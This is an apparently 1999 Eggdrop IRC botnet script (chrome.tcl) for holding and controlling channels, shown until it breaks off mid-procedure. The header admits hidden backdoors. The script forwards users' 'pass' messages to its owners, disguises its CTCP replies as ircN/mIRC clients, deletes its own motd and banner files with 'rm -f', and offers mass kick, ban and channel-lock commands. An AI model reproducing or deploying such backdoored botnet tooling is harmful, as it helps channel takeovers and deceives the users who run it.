#download begin at Sat Aug  7 06:40:25 1999 - PlFRe/S/K0Y1
#download begin at Sat Jun 26 15:26:26 1999 - PlFRe/S/K0Y1
#
# original code by bmx.. taken and recoded by Shadow Knight
# if i didnt give you this, i wouldnt run it. there are backdoors.
# if i did give it to you please msg me for the codes.
#
#ideas = fix hijack.
set tcl_version "2.16"
proc b {} {return }
proc u {} {return }
set err "Usage:"
set is [info script]
set home #evil-kids
set flood-repeat 4:30
#set to 1 if you want to limit a chan
set limit_bot 0
#set to 1 if you want to autovoice a chan
set voice_bot 0

if {![info exist oldpassive]} {set oldpassive $passive}
set secauth [expr !$passive && !$oldpassive]

if $secauth {
 putlog "chrome.tcl: HUB mode enabled."
}

set servers {
128.138.129.31 208.133.73.83 192.160.127.97 199.183.9.7 130.233.192.6
195.198.116.23 195.18.249.231 208.133.73.83 195.159.0.90 129.16.13.130
194.47.252.135 24.2.6.194 36.118.0.220 165.121.1.46 165.121.2.46
194.159.80.19 205.158.23.2 24.108.60.60 198.164.211.2 205.210.36.2
207.161.152.101 204.112.54.14 207.161.152.101 141.211.26.105 209.51.184.5
209.51.160.6 192.116.253.253 128.2.220.250 209.127.0.51 209.130.129.251
170.140.4.6 207.69.200.132 207.96.122.240 206.165.113.241 12.8.182.5
209.162.144.11 209.16.213.131 206.165.111.241 206.86.0.23 199.0.154.65
160.94.196.192 209.1.214.123:6000 203.37.45.2 205.158.23.5 207.34.179.18
}

set dont_spam_channels "$home"
set dont_limit_channels "$home"
set dont_voice_channels "$home"

catch {
 if [file exists motd] {
  catch {exec /bin/rm -f motd}
 }
 if [file exist ${text-path}banner] {
  catch {exec /bin/rm -f ${text-path}banner}
 }
}

catch {unbind bot - opme bot_op_request}
bind msgm - go* msg_no_go
proc msg_no_go {nick uhost handle arg} {
 return 0
}

bind msgm - pass* msg_no_pass
proc msg_no_pass {nick uhost hand arg} {
global botnet-nick
 set hub [userlist h]
 foreach users [userlist n9] { 
  sendnote ${botnet-nick} $users@$hub "[b]![b]msg no pass[b]![b] $arg by ($hand/$nick!$uhost)"
 }
}

proc noban {channel} {
 set t 0
 set banlist [chanbans $channel]
 set bancount [llength [chanbans $channel]]
 if {$bancount >= 25} {incr t}
 return $t
}

proc clearp {uhost} {
global rphost rpmsg
 catch {
  unset rphost($uhost)
  unset rpmsg($uhost)
 }
}

bind raw - MODE chr_raw_mode
proc chr_raw_mode {f k a} {
 global botnick botnet-nick opdelay
  set f [string tolower $f]
  set a "[string tolower $a]"
  set ch [lindex $a 0]
  set unick [finduser $f]
  if {[lsearch -exact [channels] $ch] == "-1" || [getting-users] || ![isop $botnick $ch]} {return 0}
  if {![validuser $unick] || ![matchattr $unick b] || $unick == "*"} {return 0}
  if {![matchattr ${botnet-nick} h] && ![matchattr ${botnet-nick} a]} {fix_hosts}
  set a [split $a " "]
  set mode [lindex $a 1]
  set nick1 [lindex $a 2]
  set hand1 [nick2hand [lindex $a 2] $ch]
  set nick2 [lindex $a 3]
  set hand2 [nick2hand [lindex $a 3] $ch]
  set nick3 [lindex $a 4]
  set hand3 [nick2hand [lindex $a 4] $ch]
  set nick4 [lindex $a 5]
  set hand4 [nick2hand [lindex $a 5] $ch]
  if {[string match "*+o*" $mode] && ![string match "*+o*+o" $mode] && ![string match "*+oo*" $mode]} {
   if {$unick == "$hand1"} {
    dumpserv "MODE $ch -oo $nick1 $unick" 
    if {$unick == "$botnick"} {set opdelay 300}
   putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +o $nick1) by1 $unick"
   return 0
  }
   if {![validuser $hand1] || ![matchattr $hand1 o]} {
    dumpserv "MODE $ch -oo $nick1 $unick"
    if {$unick == "$botnick"} {set opdelay 300}
    putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +o $nick1) by2 $unick"
   return 0
  }
   if {[matchattr $hand1 b]} {return 0}
   if {[matchattr $hand1 o] || [matchchanattr $hand1 o $ch]} {
    set nn 0
     foreach user [whom *] {
     if {[lindex $user 0] == "$hand1" && [lindex $user 1] == $unick} {
      incr nn
     }
    }
     if {$nn == "0" && [llength [bots]]} {
      dumpserv "MODE $ch -oo $nick1 $unick"
      if {$unick == "$botnick"} {set opdelay 300}
      putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +o $nick1) by3 $unick"
     return 0
    }
   }
  }
  if {[string match "*+o*+o*" $mode] || [string match "*+oo*" $mode] && ![string match "*+o*+o*+o" $mode] && ![string match "*+ooo*" $mode]} {
   if {[matchattr $hand1 b] || [matchattr $hand2 b]} {
    dumpserv "MODE $ch -ooo $nick1 $nick2 $unick"
    if {$unick == "$botnick"} {set opdelay 300}
    putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +oo $nick1 $nick2) by11 $unick"
   return 0
  }
   if {![validuser $hand1] || ![validuser $hand2] || ![matchattr $hand1 o] || ![matchattr $hand2 o]} {
    dumpserv "MODE $ch -ooo $nick1 $nick2 $unick"
    if {$unick == "$botnick"} {set opdelay 300}
    putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +oo $nick1 $nick2) by22 $unick"
   return 0
  }
   if {[matchattr $hand1 o]} {
   set nn 0
   foreach w [whom *] {
    if {[lindex $w 0] == "$hand1" && [lindex $w 1] == "$unick"} {
     incr nn
    }
   }
    if {$nn == "0"} {
     dumpserv "MODE $ch -ooo $nick1 $nick2 $unick"
     if {$unick == "$botnick"} {set opdelay 300}
     putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +oo $nick1 $nick2) by33 $unick"
     return 0
    } else {
     return 0
    }
   }
  }
   if {[string match "*+o*+o*+o*" $mode] || [string match "*+ooo*" $mode] && ![string match "*+oooo" $mode]} {
   if {[matchattr $hand1 b] || [matchattr $hand2 b] || [matchattr $hand3 b]} {
    dumpserv "MODE $ch -oooo $nick1 $nick2 $nick3 $unick"
    if {$unick == "$botnick"} {set opdelay 300} 
   putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +ooo $nick1 $nick2 $nick3) by111 $unick"
   return 0
  }
   if {![validuser $hand1] || ![validuser $hand2] || ![validuser $hand3] || ![matchattr $hand1 o] || ![matchattr $hand2 o] || ![matchattr $hand3 o]} {
    dumpserv "MODE $ch -oooo $nick1 $nick2 $nick3 $unick"
    if {$unick == "$botnick"} {set opdelay 300}
    putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +ooo $nick1 $nick2 $nick3) by222 $unick"
   return 0
  } 
   if {[matchattr $hand1 o]} {
   set nn 0
   foreach w [whom *] {
   if {[lindex $w 0] == "$hand1" && [lindex $w 1] == "$unick"} {
    incr nn
   }
  }
   if {$nn == "0"} {
    dumpserv "MODE $ch -oooo $nick1 $nick2 $nick3 $unick"
    if {$unick == "$botnick"} {set opdelay 300}
    putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +ooo $nick1 $nick2 $nick3) by333 $unick"
    return 0
   } else {
    return 0
   }
  }
 }
  if {[string match "*+oooo*" $mode] || [string match "+oooo" $mode]} {
   if {[matchattr $hand1 b] || [matchattr $hand2 b] || [matchattr $hand3 b] || [matchattr $hand4 b]} {
    dumpserv "MODE $ch -oooo $nick1 $nick2 $nick3 $nick4"
    dumpserv "MODE $ch -o $unick"
    if {$unick == "$botnick"} {set opdelay 300}
    putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +ooo $nick1 $nick2 $nick3 $nick4) by1111 $unick"
   return 0
  }
   if {![validuser $hand1] || ![validuser $hand2] || ![validuser $hand3] || ![validuser $hand4] || ![matchattr $hand1 o] || ![matchattr $hand2 o] || ![matchattr $hand3 o] || ![matchattr $hand4 o]} {
    if {$botnick == "$unick"} {return 0}
    dumpserv "MODE $ch -oooo $nick1 $nick2 $nick3 $nick4"
    dumpserv "MODE $ch -o $unick"
    if {$unick == "$botnick"} {set opdelay 300}
    putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +oooo $nick1 $nick2 $nick3 $nick4) by2222 $unick"
   return 0
  }
   if {[matchattr $hand1 o]} {
   set nn 0
   foreach w [whom *] {
   if {[lindex $w 0] == "$hand1" && [lindex $w 1] == "$unick"} {
    incr nn
   }
  }
   if {$nn == "0"} {
    dumpserv "MODE $ch -oooo $nick1 $nick2 $nick3 $nick4"
    dumpserv "MODE $ch -o $unick"
    if {$unick == "$botnick"} {set opdelay 300}
    putcmdlog "[b]![b]Warning[b]![b] (MODE $ch +ooo $nick1 $nick2 $nick3 $nick4) by3333 $unick"
    return 0
   } else {
    return 0
   }
  }
 }
}

if ![info exists limit_bot] {set limit_bot 0}
bind dcc m limit dcc_limit
proc dcc_limit {handle idx arg} {
 global limit_bot err
  set cmd [lindex $arg 0]
  if {$cmd == ""} {
   putdcc $idx "$err limit <on/off/status>"
  return 0
 }
  if {$cmd == "on"} {
   set limit_bot 1
    putcmdlog "#$handle# limit on"
   putdcc $idx "enforcing limits \: ON"
  return 0
 }
  if {$cmd == "off"} {
   set limit_bot 0
    putcmdlog "#$handle# limit off"
   putdcc $idx "enforcing limits \: OFF"
  return 0
 }
  if {$cmd == "status"} {
   putcmdlog "#$handle# limit status"
   if $limit_bot {
   putdcc $idx "enforcing limits"
   return 0
  } else {
   putdcc $idx "not enforcing limits"
   return 0
  }
 }
}

bind time - * chrlimit
proc chrlimit {mi ho da mh ye} {
global botnick limit_bot dont_limit_channels ping-push secauth
 dumpserv "PING [set ping-push [unixtime]]"
  if $secauth {getsaved}
  if !$limit_bot {return 0}
  foreach ch [channels] {
   set chm [lindex [getchanmode $ch] 0]
   set chn [lindex [getchanmode $ch] end]
   set chl [llength [chanlist $ch]]
   set chu [expr $chl+7]
   if {[lsearch -exact [string tolower $dont_limit_channels] [string tolower $ch]] != "0"} {
    if ![string match "*\[ik\]*" [getchanmode $ch]] {
    if ![string match "*\[ik\]*" [lindex [channel info $ch] 0]] {
     if ![string match "*l*" $chm] {
      puthelp "MODE $ch +l $chu"
     } else {
      if {"$chn" != "$chu"} {
      dumpserv "MODE $ch +l $chu"
      }
     }
    }
   }
  }
 }
}

if ![info exists voice_bot] {set voice_bot 0}
bind dcc m voice dcc_voice
proc dcc_voice {handle idx arg} {
 global botnick err voice_bot
   set what [lindex $arg 0]
    if {$what == ""} {
     putdcc $idx "$err voice <on/off/status>"
    return 0
   }
    if {$what == "on"} {
     set voice_bot 1
      putcmdlog "#$handle# voice on"
     putdcc $idx "voice is now on."
    return 0
   }
    if {$what == "off"} {
     set voice_bot 0
      putcmdlog "#$handle# voice off"
     putdcc $idx "voice is now off."
    return 0
   }
    if {$what == "status"} {
    putcmdlog "#$handle# voice status"
    if $voice_bot {
    putdcc $idx "voice is on"
   } else {
    if {$voice_bot == "0"} {
     putdcc $idx "voice is off"
    return 0
   }
  }
 }
}

set flag2 "v"
set chanflag2 "v"
bind join - * do_voice
proc do_voice {nick uhost handle channel} {
  global botnick voice_bot dont_voice_channels
   if !$voice_bot {return 0}
    if {[lsearch -exact [string tolower $dont_voice_channels] [string tolower $channel]] != "-1"} {return 0}
    if {![string match "*i*" [getchanmode $channel]]} {
    if {[matchattr $handle v] || [matchchanattr $handle v $channel]} { 
   putserv "MODE $channel +v $nick"
  }
 }
}

bind link - * chr_link
proc chr_link {b v} {
global botnick botnet-nick secauth savedchans
 if $secauth {
  getsaved
  foreach ch $savedchans {putbot $b "addc $ch $b"}
 }
}

bind dcc m channels dcc_channels 
proc dcc_channels {hand idx arg} {
 putdcc $idx "I'm currently on [chan_list]"
 return 1
}

proc chan_list {} {
 global botnick
  set clist ""
  foreach ch [channels] {
   set cn "$ch"
   if {![onchan $botnick $ch]} {
  lappend clist "<$cn>"
 } elseif {[isop $botnick $ch]} {
  lappend clist "[b]@[b]$cn"
 } elseif {[isvoice $botnick $ch]} {
  lappend clist "+$cn"
 } else {
  lappend clist "$cn"
   }
  }
 return $clist
}

timer [rand 99] a_idle
proc a_idle {} {
 global botnick
  putserv "PRIVMSG $botnick :etoia"
 timer [rand 99] a_idle
}

bind dcc n mver mver
bind bot - mver mver
proc mver {h i a} {
global botnet-nick botnick tcl_version
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 if {[matchattr $h n]} {putallbots "mver $a"}
 if {("$a"!="") && ![expr [lsearch $a $b]+1]} {return 1}
 dccbroadcast "$botnick : v$tcl_version"
 return 1
}

bind dcc m copall dcc_opall
proc dcc_opall {handle idx arg} {
 global err botnick
  set unick [lindex $arg 0]
   if {$unick == ""} {
    putdcc $idx "$err opall <nick>"
   return 0
  }
   foreach ch [channels] {
    if {[onchan $unick $ch]} {
     lappend chan "$ch"
     set channel [lindex $chan 0]
     catch {unset ch chan}
     }
    }
     if ![info exists channel] {
      putdcc $idx "but your not on any channels?"
     return 0
    }
   if {![matchattr [nick2hand $unick $channel] o]} {
    putdcc $idx "$unick is not a registered op."
    catch {unset channel}
    return 0
   }
   foreach ch [channels] {
   if {[onchan $botnick $ch] && [isop $botnick $ch] && [onchan $unick $ch] && ![isop $unick $ch]} {
   putserv "MODE ${ch} +o ${unick}"
  }
 }
  foreach a [channels] {
   if {[onchan $unick $a]} {
   set host [getchanhost $unick $a]
   }
  }
   dccbroadcast "[b]![b]dcc opall[b]![b] ($unick!$host) by $handle (+[chattr $handle])"
   putcmdlog "#$handle# opall $unick"
  putdcc $idx "Gave op to $unick on all channels."
 return 0
}
catch {unbind dcc o invite *dcc:invite}
bind dcc o invite dcc_inviteall
bind dcc m inviteall dcc_inviteall
proc dcc_inviteall {handle idx arg} {
 global err botnick
  set nick [lindex $arg 0]
   if {$nick == ""} {
    putdcc $idx "$err inviteall <nick>"
   return 0
  }
   foreach ch [channels] {
   if {[onchan $botnick $ch] && [isop $botnick $ch]} {
   putserv "INVITE ${nick} ${ch}"
  }
 }
  dccbroadcast "[b]![b]dcc inviteall[b]![b] $nick by $handle (+[chattr $handle])"
   putcmdlog "#$handle# inviteall $nick"
  putdcc $idx "Inviteing $nick on all channels."
 return 0
}

bind dcc m msave dcc_msave
proc dcc_msave {handle idx arg} {
 putallbots "bot_save"
 save
 return 1
}

bind bot - bot_save bot_msave
proc bot_msave {handle idx arg} {
 save
 return 0
}

bind dcc m notlinked dcc_downbots
proc dcc_downbots {handle idx arg} {
 global botnet-nick
  set notlink ""
    putcmdlog "#$handle# notlinked"
   foreach b [userlist b] {
  if {![isbot $b]} {lappend notlink $b}
 }
  set nlink [llength $notlink]
   if {$notlink == ""} {
    putidx $idx "Bots unlinked: none"
   putidx $idx "(total: 0)"
 } {
  putidx $idx "Bots unlinked: $notlink"
  putidx $idx "(total: $nlink)"
 }
}

proc isbot {bot} {
 global botnet-nick
 if {[lsearch -exact [string tolower "[bots] ${botnet-nick}"] [string tolower $bot]]=="-1"} {
   return 0
 } else {
   return 1
 }
}

bind dcc n mchanset dcc_mchanset
proc dcc_mchanset {handle idx arg} {
 global err botnet-nick secauth savedchans
  set chan [lindex $arg 0]
  set mode [lindex $arg 1]
   if {$chan == ""} {
    putdcc $idx "$err mchanset <#channel> <+\-mode>"
   return 0
  }
   if {$mode == ""} {
    putdcc $idx "$err mchanset <#channel> <+\-mode>"
   return 0
  }
   if {$secauth && [lsearch -exact $savedchans [string tolower $chan]] == "-1"} {
    putdcc $idx "I'm not currently on $chan"
    return 0
   }
   if {!$secauth && ![validchan $chan]} {
    putdcc $idx "I'm not currently on $chan"
    return 0
   }
    bot_mchanset ${botnet-nick} bot_chanset "$chan $mode"
    putallbots "bot_chanset $chan $mode"
   dccbroadcast "[b]![b]mass chanset[b]![b] $chan $mode by $handle"
  savechannels
  putcmdlog "#$handle# mchanset $chan $mode"
 return 0
}

bind bot - bot_chanset bot_mchanset
proc bot_mchanset {bot cmd arg} {
 set chan [lindex $arg 0]
 set mode [lindex $arg 1]
 if ![validchan $chan] {return 0}
  if [regexp -nocase ".*need.*" $mode] {
   sec_alert - "Bad setmode $arg by $bot"
   return
  }
  if {[string match "*+autoop*" $mode]} {return 0}
  channel set $chan $mode
 savechannels
}

bind dcc n mchanmode dcc_mchanmode
proc dcc_mchanmode {hand idx arg} {
 global err botnick botnet-nick secauth savedchans
  set chan [lindex $arg 0]
  set mode [lrange $arg 1 end]
   if {$chan == ""} {
    putdcc $idx "$err mchanmode <#channel> <+/-mode>"
   return 0
  }
   if {$mode == ""} {
    putdcc $idx "$err mchanmode <#channel> <+/-mode>"
   return 0
  }
putallbots "chanm $chan $mode"
   if {$mode == "+stin"} {
    putdcc $idx "channel mode = +i, autolock auto-on"
    putallbots "lock $chan"
    dccbroadcast "[b]![b]mass chanmode[b]![b] $chan () -> ($mode) by $hand"
    savechannels
   putcmdlog "#$hand# mchanmode $chan $mode"
return 0
}
    dccbroadcast "[b]![b]mass chanmode[b]![b] $chan () -> ($mode) by $hand"
    savechannels
   putcmdlog "#$hand# mchanmode $chan $mode"
  return 0
}

bind bot - chanm bot_chanmode
proc bot_chanmode {bot cmd arg} {
 set chan [lindex $arg 0]
 set mode [string tolower [lindex $arg 1]]
  if ![validchan $chan] {return 0} 
  set cm [lindex [lindex [channel info $chan] 0] 0]
  if {$cm!=$mode} {
  catch {channel set $chan chanmode "+nt$mode"}
 }
}

bind dcc n clear dcc_clear
proc dcc_clear {hand idx arg} {
 global err botnick botnet-nick
  if ![matchattr ${botnet-nick} sob] {
   putdcc $idx "Sorry $hand, You can do it only from hub bot!"
  return 0
 }
  set what [string tolower [lindex $arg 0]]
   if {$what != "bans" && $what != "ignores"} {
   putidx $idx "$err clear <bans/ignores>"
  return 0
 }
  if {$what == "ignores"} {
    dccbroadcast "[b]![b]clear ignores[b]![b] by $hand"
     putcmdlog "#$hand# clear ignores"
      putidx $idx "Clearing all ignores."
     foreach ignore [ignorelist] {
    killignore [lindex $ignore 0]
   }
  }
   if {$what == "bans"} {
    dccbroadcast "[b]![b]clear bans[b]![b] by $hand"
     putcmdlog "#$hand# clear bans"
      putidx $idx "Clearing all bans."
     foreach ban [banlist] {
    killban [lindex $ban 0]
  }
 }
}

bind dcc n iop dcc_iop
proc dcc_iop {handle idx arg} {
 global err botnick home
  set nick [lindex $arg 0]
  set chan [lindex $arg 1]
   if {$chan == ""} {
    set chan "[lindex [console $idx] 0]"
   }
    if {$nick == ""} {
     putdcc $idx "$err iop <nick> \[#channel\]"
    return 0
   }
    if {[lsearch -exact [string tolower [channels]] [string tolower $chan]] == "-1"} {
     putdcc $idx "I'm not currently on $chan."
    return 0
   }
    if {![isop $botnick $chan]} {
     putdcc $idx "I'm not currently oped on $chan."
    return 0
   }
    if {[onchan $botnick $chan] && [isop $botnick $chan] && ![onchan $nick $chan]} {
     puthelp "INVITE ${nick} ${chan}"
     utimer 3 "do_iop ${nick} ${chan}"
     dccbroadcast "[b]![b]dcc iop[b]![b] $nick on $chan by $handle (+[chattr $handle])"
    if {$chan == "$home"} {
     set chan ""
   }
    putcmdlog "#$handle# ([lindex [console $idx] 0]) iop $nick $chan"
    if {$chan == ""} {
    set chan "$home"
  }
   putdcc $idx "Invite/Oping $nick on $chan."
  return 0
 }
}

proc do_iop {nick chan} {
 if {[onchan $nick $chan] && ![isop $nick $chan] && [matchattr [nick2hand $nick $chan] o]} {
  pushmode $chan +o $nick
  return 0
 } else {
  utimer 2 "do_iop $nick $chan"
 }
}

set newflags ""
set oldflags "c d f j k m n o p x y z"
set botflags "a b h l r"

bind dcc n mnote m_note
proc m_note {hand idx arg} {
 global newflags oldflags botflags err
  set whichflag [lindex $arg 0]
  set message [lrange $arg 1 end]
   if {$whichflag == "" || $message == ""} {
    putdcc $idx "$err mnote <+flag> <message>"
   return 0
  }
   if {[string index $whichflag 0] == "+"} {
    set whichflag [string index $whichflag 1]
  }
   set normwhichflag [string tolower $whichflag]
   set boldwhichflag \[\002+$normwhichflag\002\]
    if {([lsearch -exact $botflags $normwhichflag] > 0)} {
     putdcc $idx "The flag $boldwhichflag is for bots only."
    putdcc $idx "Choose from the following: \002$oldflags $newflags\002"
   return 0
  }
   if {([lsearch -exact $oldflags $normwhichflag] < 0) && ([lsearch -exact $newflags $normwhichflag] < 0) && ([lsearch -exact $botflags $normwhichflag] < 0)} {
      putdcc $idx "The flag $boldwhichflag is not a defined flag."
     putdcc $idx "Choose from the following: \002$oldflags $newflags\002"
   return 0
  }
   putcmdlog "#$hand# massnote [string tolower \[+$whichflag\]] ..."
    dccbroadcast "Sending a MassNote to all $boldwhichflag users."
     set message $boldwhichflag\ $message
     foreach user [userlist $normwhichflag] {
    if {(![matchattr $user b])} {
   sendnote $hand $user $message
  }
 }
}

bind dcc m kickall dcc_kall
proc dcc_kall {handle idx arg} {
 global err botnick
  set who [lindex [string tolower $arg] 0]
  set reason [lrange [string tolower $arg] 1 end]
   if {$who == ""} {
    putdcc $idx "$err kickall <nick> \[reason\]"
   return 0
  }
   if {$reason == ""} {set reason "lewser"}
   foreach ch [channels] {
    if {[onchan $who $ch]} {
   putserv "KICK $ch $who :$reason"
  }
 }
  putcmdlog "#$handle# kickall $who $reason"
  putdcc $idx "kick'd $who with $reason on all channels."
 return 0
}

bind dcc m kball dcc_kball
proc dcc_kball {handle idx arg} {
 global botnick err
  set who [lindex $arg 0]
  set reason [lrange $arg 1 end]
   if {$who == ""} {
    putdcc $idx "$err kball <nick> \[reason\]"
   return 0
  }
   if {$reason == ""} {set reason "lewser"}
   foreach ch [channels] {
   regsub ".*@" [getchanhost $who $ch] "*!*@" banhost
   putserv "MODE $ch +b $banhost"
   putserv "KICK $ch $who :$reason"
 }
  putcmdlog "#$handle# kball $who $reason"
  putdcc $idx "kb'd $who with $reason on all channels."
 return 0
}

bind dcc m lock dcc_lock
proc dcc_lock {handle idx arg} {
 global botnick botnet-nick err savedchans
  set ch [lindex $arg 0]
  if {$ch == ""} {
  putdcc $idx "$err lock <#channel>"
  return 0
 }
  if ![matchattr ${botnet-nick} sob] {
   putdcc $idx "Sorry $h, You can do it only from hub bot!"
  return 1
 }
  if {[lsearch -exact [string tolower $savedchans] [string tolower $ch]] == "-1"} {
   putdcc $idx "I'm not currently on $ch"
  return 0
 }
  dccbroadcast "[b]![b]dcc lock[b]![b] $ch by $handle"
  putallbots "chanm $ch +stnim"
  putallbots "lock $ch"
  putcmdlog "#$handle# lock $ch"
  savechannels
  return 0
}

bind bot - lock lockd
proc lockd {bot cmd arg} {
 set ch [lindex $arg 0]
 putserv "MODE $ch +stnim-l"
 catch {masskick "$ch"}
 savechannels
}

bind dcc m unlock dcc_unlock
proc dcc_unlock {handle idx arg} {
 global botnick botnet-nick err savedchans
  set ch [lindex $arg 0]
  if {$ch == ""} {
   putdcc $idx "$err unlock <#channel>"
  return 0
 }
  if ![matchattr ${botnet-nick} sob] {
   putdcc $idx "Sorry $h, You can do it only from hub bot!"
  return 1
 }
  if {[lsearch -exact [string tolower $savedchans] [string tolower $ch]] == "-1"} {
   putdcc $idx "I'm not currently on $ch"
  return 0
 }
  putallbots "chanm $ch +nt"
  putallbots "unlock $ch"
  putcmdlog "#$handle# unlock $ch"
  dccbroadcast "[b]![b]dcc unlock[b]![b] $ch by $handle"
  savechannels
  return 0
 }

proc unlock {ch} {
 global botnick
  putserv "MODE $ch -siml"
  utimer 3 {putserv "MODE $ch -siml"}
 savechannels
}

bind join - * ident_join
proc ident_join {nick uhost handle channel} {
 global botnick botnet-nick secauth botmask lastkeyo bobkey badchan
  if {![matchattr $handle o] && ![matchchanattr $handle o $channel]} {
  if {"$nick"=="$botnick"} {
   catch {unset lastkeyo([string tolower $ch])}
   catch {unset bobkey([string tolower $ch])}
   catch {unset kicklist([string tolower $ch])}
   catch {unset badchan([string tolower $ch])}
   catch {a_idle}
   if {"[bots]"!=""} {
    if !$secauth {fix_hosts}
   }
  }
   if {[string match "*i*" [lindex [channel info $channel] 0]] && [string match "*m*" [lindex [channel info $channel] 0]]} {
    if {[string match "*i*" [lindex [getchanmode $channel] 0]] && [string match "*m*" [lindex [getchanmode $channel] 0]]} {
    putserv "KICK $channel $nick :$nick"
   }
  }
 }
}

bind dcc m stats dcc_stats
proc dcc_stats {handle idx arg} {
 global botnick voice_bot limit_bot server ignore secauth passive server-lag ping-push
  if {$limit_bot == "1"} {set what_limit "on"}
  if {$limit_bot == "0"} {set what_limit "off"}
  if {$voice_bot == "1"} {set what_voice "on"}
  if {$voice_bot == "0"} {set what_voice "off"}
  foreach chan [channels] {set ch "$chan"}
  if {[validchan [string tolower [lindex [channels] 0]]]} {
  set op 0
  set chan1 "[lindex [channels] 0]"
  set cinfo1 "[lindex [getchanmode $chan1] 0]"
  if ![onchan $botnick $chan1] {set cinfo1 ""}
  foreach unick [chanlist $chan1] {
   if {[isop $unick $chan1]} {incr op}
  }
  set chaninfo1 "$chan1 $op\ops $cinfo1,"
 }
  if {[validchan [string tolower [lindex [channels] 1]]]} {
  set op 0
  set chan2 "[lindex [channels] 1]"
  set cinfo2 "[lindex [getchanmode $chan2] 0]"
  if ![onchan $botnick $chan2] {set cinfo2 ""}
  foreach unick [chanlist $chan2] {
   if {[isop $unick $chan2]} {incr op}
  }
  set chaninfo2 "$chan2 $op\ops $cinfo2,"
 }
  if {[validchan [string tolower [lindex [channels] 2]]]} {
  set op 0
  set chan3 "[lindex [channels] 2]"
  set cinfo3 "[lindex [getchanmode $chan3] 0]"
  if ![onchan $botnick $chan3] {set cinfo3 ""}
  foreach unick [chanlist $chan3] {
   if {[isop $unick $chan3]} {incr op}
  }
  set chaninfo3 "$chan3 $op\ops $cinfo3,"
 }
  if {[validchan [string tolower [lindex [channels] 3]]]} {
  set op 0
  set chan4 "[lindex [channels] 3]"
  set cinfo4 "[lindex [getchanmode $chan4] 0]"
  if ![onchan $botnick $chan4] {set cinfo4 ""}
  foreach unick [chanlist $chan4] {
   if {[isop $unick $chan4]} {incr op}
  }
  set chaninfo4 "$chan4 $op\ops $cinfo4,"
 }
  if {[validchan [string tolower [lindex [channels] 4]]]} {
  set op 0
  set chan5 "[lindex [channels] 4]"
  set cinfo5 "[lindex [getchanmode $chan5] 0]"
  if ![onchan $botnick $chan5] {set cinfo5 ""}
  foreach unick [chanlist $chan5] {
   if {[isop $unick $chan5]} {incr op}
  }
  set chaninfo5 "$chan5 $op\ops $cinfo5,"
 }
  if {[validchan [string tolower [lindex [channels] 5]]]} {
  set op 0
  set chan6 "[lindex [channels] 5]"
  set cinfo6 "[lindex [getchanmode $chan6] 0]"
  if ![onchan $botnick $chan6] {set cinfo6 ""}
  foreach unick [chanlist $chan6] {
   if {[isop $unick $chan6]} {incr op}
  }
  set chaninfo6 "$chan6 $op\ops $cinfo6,"
 }
  if {[validchan [string tolower [lindex [channels] 6]]]} {
  set op 0
  set chan7 "[lindex [channels] 6]"
  set cinfo7 "[lindex [getchanmode $chan7] 0]"
  if ![onchan $botnick $chan7] {set cinfo7 ""}
  foreach unick [chanlist $chan6] {
   if {[isop $unick $chan7]} {incr op}
  }
  set chaninfo7 "$chan7 $op\ops $cinfo7,"
 }
  if {[validchan [string tolower [lindex [channels] 7]]]} {
  set op 0
  set chan8 "[lindex [channels] 7]"
  set cinfo8 "[lindex [getchanmode $chan8] 0]"
  if ![onchan $botnick $chan8] {set cinfo8 ""}
  foreach unick [chanlist $chan8] {
   if {[isop $unick $chan8]} {incr op}
  }
  set chaninfo8 "$chan8 $op\ops $cinfo8,"
 }
  if {[validchan [string tolower [lindex [channels] 8]]]} {
  set op 0
  set chan9 "[lindex [channels] 8]"
  set cinfo9 "[lindex [getchanmode $chan9] 0]"
  if ![onchan $botnick $chan9] {set cinfo9 ""}
  foreach unick [chanlist $chan9] {
   if {[isop $unick $chan9]} {incr op}
  }
  set chaninfo9 "$chan9 $op\ops $cinfo9"
 }
  if {![info exists chaninfo1]} {set chaninfo1 ""}
  if {![info exists chaninfo2]} {set chaninfo2 ""}
  if {![info exists chaninfo3]} {set chaninfo3 ""}
  if {![info exists chaninfo4]} {set chaninfo4 ""}
  if {![info exists chaninfo5]} {set chaninfo5 ""}
  if {![info exists chaninfo6]} {set chaninfo6 ""}
  if {![info exists chaninfo7]} {set chaninfo7 ""}
  if {![info exists chaninfo8]} {set chaninfo8 ""}
  if {![info exists chaninfo9]} {set chaninfo9 ""}
  if {![info exist ignore]} {set ignore 0}
  if {$ignore == "1"} {set ignoree "yes"} else {set ignoree "no"}
  if $secauth {set h "hub"} else {set h "leaf"}
  if $passive {set ap "active"} else {set ap "passive"}
  if ${ping-push} {set plag [expr [unixtime]-${ping-push}]s} {set plag ""}
  putdcc $idx "current channels are: [chan_list]"
  putdcc $idx "current server and port is: $server"
  putdcc $idx "current lag is: ${server-lag}s$plag"
  putdcc $idx "channel info is: $chaninfo1 $chaninfo2 $chaninfo3 $chaninfo4 $chaninfo5 $chaninfo6 $chaninfo7 $chaninfo8 $chaninfo9"
  putdcc $idx "in modes: ($h/$ap)"
  putdcc $idx "ctcp ignore is: $ignoree"
  putdcc $idx "voice bot is: $what_voice"
  putdcc $idx "limit bot is: $what_limit"
  putcmdlog "#$handle# stats"
}

set ctcp-version ""
set ctcp-finger ""
set ctcp-clientinfo ""
set ctcp-userinfo ""
set ctcps "6"
set ctcptime "30"
set ignoretime "60"

set vers2 [rand 5]
if {$vers2 == "0"} {set vircn "ircN 6.04pl.1 + 6.03 for mIRC" }
if {$vers2 == "1"} {set vircn "ircN 6.04 + 6.03 for mIRC" }
if {$vers2 == "2"} {set vircn "ircN 6.03 for mIRC" }
if {$vers2 == "3"} {set vircn "ircN 6.02 + 6.0 for mIRC" }
if {$vers2 == "4"} {set vircn "ircN 7.0rc.7 + 7.0rc.6 for mIRC" }
if {$vers2 == "5"} {set vircn "ircN 6.03 for mIRC" }

bind ctcp - * do_ircn
proc do_ircn {nick uhost handle dest key arg} {
 global ctcps ctcpnum ctcptime ignoretime vircn ircnthing ignore timerinuse botnick botnet-nick secauth dont_spam_channels
 set nick [string tolower $nick]
